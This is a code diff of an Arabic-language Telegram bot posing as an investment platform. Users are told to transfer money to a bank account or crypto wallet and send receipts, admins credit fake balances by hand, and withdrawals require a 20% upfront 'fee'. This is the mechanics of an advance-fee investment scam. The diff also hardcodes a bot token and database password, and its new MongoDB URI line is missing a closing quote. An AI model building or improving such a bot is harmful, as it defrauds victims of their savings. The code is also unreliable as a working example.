@@ -1,106 +1,169 @@
-import os, urllib.parse, logging
-from flask import Flask
-from threading import Thread
+import logging
+import os
 from pymongo import MongoClient
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
 
-# --- ⚙️ الإعدادات ---
-logging.basicConfig(level=logging.INFO)
-flask_app = Flask('')
-@flask_app.route('/')
-def home(): return "🚀 System Stabilized"
+# إعداد السجلات لمراقبة أداء البوت على السيرفر
+logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
+logger = logging.getLogger(__name__)
 
-def keep_alive():
-    t = Thread(target=lambda: flask_app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000))))
-    t.daemon = True; t.start()
-
-# --- 🔑 البيانات ---
+# ================= [ ⚙️ إعدادات الإمبراطور ] =================
 TOKEN = '8731999916:AAHDjo1noyGIbUH699aTjNns9kCjP8P9SHc'
-ADMINS = [6016547718]
-SUPPORT = "https://t.me/HCICICVICIF9"
+ADMIN_USERNAME = 'HCICICVICIF9'
 
-u_s, p_s = urllib.parse.quote_plus('Abduh'), urllib.parse.quote_plus('A11223344@5566')
-MONGO_URI = f"mongodb+srv://{u_s}:{p_s}@cluster0.0a4wefx.mongodb.net/DragonFinal?retryWrites=true&w=majority"
+# قائمة المديرين (أضف معرفاتك ومعرفات شركائك هنا)
+ADMINS_LIST = [6016547718] # يمكنك إضافة المزيد مثل: [6016547718, 12345678]
 
+# رابط المونغو الخاص بك
+MONGO_URI = "mongodb+srv://Abduh:A11223344@5566@cluster0.0a4wefx.mongodb.net/DragonFinal?retryWrites=true&w=majority
+BANK_ACCOUNT = "SA0000000000000000000000"
+CRYPTO_WALLET = "TLtLuhkU2kkkR1Wz1TtrBTpoNRTNviYpsA"
+
+# مبالغ الاستثمار المحدثة (صفين)
+PRICES_SAR = ["1000", "1500", "2000", "3000", "5000", "7000", "8000", "10000", "15000", "20000", "30000", "50000"]
+PRICES_USD = ["300", "400", "500", "600", "800", "1000", "2000", "3000", "5000", "20000", "30000"]
+# ===============================================================
+
+# --- 🗄️ الاتصال بقاعدة بيانات MongoDB ---
 try:
-    client = MongoClient(MONGO_URI, serverSelectionTimeoutMS=5000)
-    users_col = client.get_database()['investors']
-except: users_col = None
+    client = MongoClient(MONGO_URI)
+    db = client['investment_platform']
+    users_col = db['users']
+    logger.info("✅ تم الاتصال بسحابة MongoDB بنجاح")
+except Exception as e:
+    logger.error(f"❌ فشل الاتصال بالمونغو: {e}")
 
-# --- 🛠️ الوظائف ---
-def get_u(uid):
-    d = {"uid": int(uid), "sar": 0.0, "usd": 0.0, "t": 0}
-    if users_col is None: return d
-    res = users_col.find_one({"uid": int(uid)})
-    return res if res else d
+def get_user_data(uid):
+    user = users_col.find_one({"uid": uid})
+    if not user:
+        user = {"uid": uid, "bal_sar": 0.0, "bal_usd": 0.0}
+        users_col.insert_one(user)
+    return user
 
-# --- 🏠 الواجهة الرئيسية ---
+def update_balance(uid, curr, amt):
+    field = "bal_sar" if curr == "sr" else "bal_usd"
+    users_col.update_one({"uid": uid}, {"$inc": {field: float(amt)}})
+
+# --- 🏠 واجهة المستخدم ---
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    kb = [
-        [InlineKeyboardButton("🇸🇦 استثمار (﷼)", callback_data='u_dep_sr'), InlineKeyboardButton("🇺🇸 استثمار ($)", callback_data='u_dep_us')],
-        [InlineKeyboardButton("💳 محفظتي", callback_data='u_w'), InlineKeyboardButton("📈 صفقاتي", callback_data='u_tr')],
-        [InlineKeyboardButton("📤 طلب سحب", callback_data='u_wd')],
-        [InlineKeyboardButton("👨‍💻 الدعم الفني", url=SUPPORT)]
+    user = update.effective_user
+    get_user_data(user.id)
+
+    keyboard = [
+        [InlineKeyboardButton("🇸🇦 استثمار (بالريال السعودي)", callback_data='c_sr'),
+         InlineKeyboardButton("🇺🇸 استثمار (بالدولار)", callback_data='c_us')],
+        [InlineKeyboardButton("💰 محفظتي المالية", callback_data='wallet')],
+        [InlineKeyboardButton("📤 طلب سحب الأرباح", callback_data='withdraw')],
+        [InlineKeyboardButton("💬 التواصل مع الإدارة", url=f"https://t.me/{ADMIN_USERNAME}")]
     ]
-    txt = "👑 **مرحباً بك في شركة سهم القابضة**\n\nاختر فئة الاستثمار لبدء العمل:"
-    if update.message: await update.message.reply_text(txt, reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
-    else: await update.callback_query.edit_message_text(txt, reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
 
-async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    q = update.callback_query; uid = q.from_user.id; data = q.data
-    await q.answer() # فك التعليق فوراً
-    
-    # قسم المستخدم (يبدأ بـ u_)
-    if data == 'u_main': await start(update, context)
-    elif data == 'u_w':
-        u = get_u(uid)
-        await q.edit_message_text(f"🏦 **رصيدك:**\n\n🇸🇦 `{u['sar']:,}` ﷼\n🇺🇸 `{u['usd']:,}` $", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙", callback_data='u_main')]]), parse_mode='Markdown')
-    elif data == 'u_tr':
-        u = get_u(uid)
-        await q.edit_message_text(f"📈 **الصفقات:** `{u['t']}`", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙", callback_data='u_main')]]))
-    elif data == 'u_wd':
-        u = get_u(uid)
-        r_s, r_u = u['sar']*0.2, u['usd']*0.2
-        await q.edit_message_text(f"📤 **سحب الأرباح:**\n\nالرسوم (20%): `{r_s:,.1f}` ﷼ أو `{r_u:,.1f}` $\n\n**ادفع الرسوم لفتح البوابة.**", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙", callback_data='u_main')]]), parse_mode='Markdown')
-    elif data.startswith('u_dep_'):
-        curr = data.split('_')[2]
-        vals = ["1000", "5000", "10000"] if curr == 'sr' else ["300", "1000", "5000"]
-        btns = [[InlineKeyboardButton(f"{v}", callback_data=f"u_sel_{curr}_{v}")] for v in vals]
-        btns.append([InlineKeyboardButton("🔙", callback_data='u_main')])
-        await q.edit_message_text("📊 **اختر المبلغ:**", reply_markup=InlineKeyboardMarkup(btns))
-    elif data.startswith('u_sel_'):
-        _, _, curr, amt = data.split('_')
-        info = "الراجحي: `1234567890` باسم سهم القابضة" if curr == 'sr' else "USDT: `TLtLuhkU...`"
-        await q.edit_message_text(f"✨ **إيداع {amt}:**\n\n{info}\n\n📸 **أرسل الإيصال الآن.**", parse_mode='Markdown')
+    text = (f"🏦 **المنصة العالمية للاستثمار**\n\n"
+            f"مرحباً بك سيد {user.first_name}\n"
+            f"يرجى ارسال بياناتك هنا ثم اختر القسم المطلوب للبدء:")
 
-    # قسم المالك (يبدأ بـ a_)
-    elif data.startswith('a_'):
-        if uid not in ADMINS: return
-        # الصيغة: a_العملية_العملة_المبلغ_المعرف
-        p = data.split('_')
-        act, cur, amt, tid = p[1], p[2], p[3], p[4]
-        if act == 'v':
-            key = "sar" if cur == "sr" else "usd"
-            if users_col: users_col.update_one({"uid": int(tid)}, {"$inc": {key: float(amt), "t": 1}}, upsert=True)
-            await q.edit_message_caption("✅ تم الاعتماد!")
-            try: await context.bot.send_message(tid, f"🎊 تم شحن `{amt}` في محفظتك!")
+    if update.message:
+        await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
+    else:
+        await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
+
+async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    data = query.data
+    uid = query.from_user.id
+    await query.answer()
+
+    if data == 'main':
+        await start(update, context)
+
+    elif data == 'wallet':
+        u = get_user_data(uid)
+        text = f"📊 **تفاصيل محفظتك:**\n\n🇸🇦 ريال: `{u['bal_sar']:,}`\n🇺🇸 دولار: `{u['bal_usd']:,}`"
+        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data='main')]]), parse_mode='Markdown')
+
+    elif data == 'withdraw':
+        u = get_user_data(uid)
+        if u['bal_sar'] <= 0 and u['bal_usd'] <= 0:
+            await query.edit_message_text("❌ محفظتك فارغة حالياً.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙", callback_data='main')]]))
+        else:
+            msg = "📤 **إجراءات سحب الأرباح:**\n\n"
+            if u['bal_sar'] > 0:
+                fee_sar = u['bal_sar'] * 0.20
+                msg += f"🇸🇦 رصيدك: `{u['bal_sar']:,}` ريال\n⚠️ يرجى دفع رسوم سحب الأرباح (20%): `{fee_sar:,}` ريال\n"
+                msg += "--------------------------\n"
+            if u['bal_usd'] > 0:
+                fee_usd = u['bal_usd'] * 0.20
+                msg += f"🇺🇸 رصيدك: `{u['bal_usd']:,}` دولار\n⚠️ يرجى دفع رسوم سحب الأرباح (20%): `{fee_usd:,}` دولار\n"
+            msg += "\n💡 الرسوم لفتح بوابة التحويل الدولي."
+            await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data='main')]]), parse_mode='Markdown')
+
+    elif data == 'c_sr' or data == 'c_us':
+        curr = 'sr' if data == 'c_sr' else 'us'
+        prices = PRICES_SAR if curr == 'sr' else PRICES_USD
+        kb = [prices[i:i+2] for i in range(0, len(prices), 2)]
+        btns = [[InlineKeyboardButton(f"{p} {'ريال' if curr=='sr' else '$'}", callback_data=f"{curr[0]}_{p}") for p in row] for row in kb]
+        btns.append([InlineKeyboardButton("🔙 رجوع", callback_data='main')])
+        await query.edit_message_text(f"🏦 اختر مبلغ الاستثمار:", reply_markup=InlineKeyboardMarkup(btns))
+
+    elif data.startswith('s_') or data.startswith('u_'):
+        c_type = 'sr' if data.startswith('s_') else 'us'
+        amt = data.split('_')[1]
+        addr = BANK_ACCOUNT if c_type == 'sr' else CRYPTO_WALLET
+        await query.edit_message_text(f"✅ تم اختيار {amt}\nحول إلى:\n`{addr}`\n\n📸 أرسل الإيصال هنا.", parse_mode='Markdown')
+
+    # --- 🛠️ معالجة أوامر المديرين (تأكيد/رفض) ---
+    elif data.startswith('ok_') or data.startswith('no_'):
+        if uid not in ADMINS_LIST:
+            await query.answer("❌ عذراً، هذا الزر للمديرين فقط!", show_alert=True)
+            return
+
+        if data.startswith('ok_'):
+            _, c, a, target = data.split('_')
+            update_balance(int(target), c, float(a))
+            await query.answer(f"✅ تمت إضافة {a} {c}", show_alert=True)
+            # مسح الرسالة عند جميع المديرين لعدم التكرار
+            await query.edit_message_caption(caption=f"✅ تم تأكيد الإيداع بمبلغ {a} {c} بواسطة أحد المديرين.")
+            try:
+                await context.bot.send_message(chat_id=int(target), text=f"🎉 تم إيداع `{a}` {c} في محفظتك بنجاح!")
             except: pass
-        else: await q.edit_message_caption("❌ تم الرفض.")
 
-async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    u = update.effective_user
-    await update.message.reply_text("⏳ جاري المراجعة...")
-    # أزرار المالك (مختصرة جداً لضمان الاستجابة)
-    def b(v, c): return InlineKeyboardButton(f"✅ {v}", callback_data=f"a_v_{c}_{v}_{u.id}")
-    kb = [[b("1000", "sr"), b("5000", "sr")], [b("300", "us"), b("1000", "us")], [InlineKeyboardButton("❌ رفض", callback_data=f"a_x_0_0_{u.id}")]]
-    for adm in ADMINS: await context.bot.send_photo(adm, update.message.photo[-1].file_id, caption=f"🔔 إيداع: {u.first_name}\nID: `{u.id}`", reply_markup=InlineKeyboardMarkup(kb))
+        elif data.startswith('no_'):
+            t = data.split('_')[1]
+            await query.answer("❌ تم الرفض")
+            await query.edit_message_caption(caption="❌ تم رفض هذا الإيصال من قبل أحد المديرين.")
+            try:
+                await context.bot.send_message(chat_id=int(t), text=" ❌ تم رفض الإيصال من قبل الإدارة.")
+            except: pass
+
+async def handle_receipt(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.message.photo:
+        user = update.effective_user
+        await update.message.reply_text("✅ تم استلام الإيصال، جاري المراجعة...")
+
+        kb = [
+            [InlineKeyboardButton("➕ 1000 ريال", callback_data=f"ok_sr_1000_{user.id}"), InlineKeyboardButton("➕ 100 $", callback_data=f"ok_us_100_{user.id}")],
+            [InlineKeyboardButton("➕ 5000 ريال", callback_data=f"ok_sr_5000_{user.id}"), InlineKeyboardButton("➕ 500 $", callback_data=f"ok_us_500_{user.id}")],
+            [InlineKeyboardButton("➕ 10000 ريال", callback_data=f"ok_sr_10000_{user.id}"), InlineKeyboardButton("➕ 1000 $", callback_data=f"ok_us_1000_{user.id}")],
+            [InlineKeyboardButton("➕ 20000 ريال", callback_data=f"ok_sr_20000_{user.id}"), InlineKeyboardButton("➕ 5000 $", callback_data=f"ok_us_5000_{user.id}")],
+            [InlineKeyboardButton("➕ 50000 ريال", callback_data=f"ok_sr_50000_{user.id}"), InlineKeyboardButton("➕ 20000 $", callback_data=f"ok_us_20000_{user.id}")],
+            [InlineKeyboardButton("❌ رفض الإيصال", callback_data=f"no_{user.id}")]
+        ]
+        cap = f"🔔 **لوحة المالك**\nالاسم: {user.first_name}\nID: `{user.id}`\n\nاختر المبلغ المراد إضافته:"
+
+        # إرسال الإيصال لجميع المديرين في القائمة
+        for admin_id in ADMINS_LIST:
+            try:
+                await context.bot.send_photo(chat_id=admin_id, photo=update.message.photo[-1].file_id, caption=cap, reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
+            except Exception as e:
+                logger.error(f"فشل الإرسال للمدير {admin_id}: {e}")
 
 if __name__ == '__main__':
-    keep_alive()
-    app = Application.builder().token(TOKEN).build()
+    # تشغيل البوت بنظام المعالجة المتوازية للسرعة القصوى
+    app = Application.builder().token(TOKEN).concurrent_updates(True).build()
+
     app.add_handler(CommandHandler('start', start))
-    app.add_handler(CallbackQueryHandler(handle_buttons))
-    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
-    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), start))
+    app.add_handler(CallbackQueryHandler(button_handler))
+    app.add_handler(MessageHandler(filters.PHOTO, handle_receipt))
+
+    logger.info("🚀 المنصة تعمل بنظام الإدارة المشتركة والمونغو السحابي...")
     app.run_polling(drop_pending_updates=True)
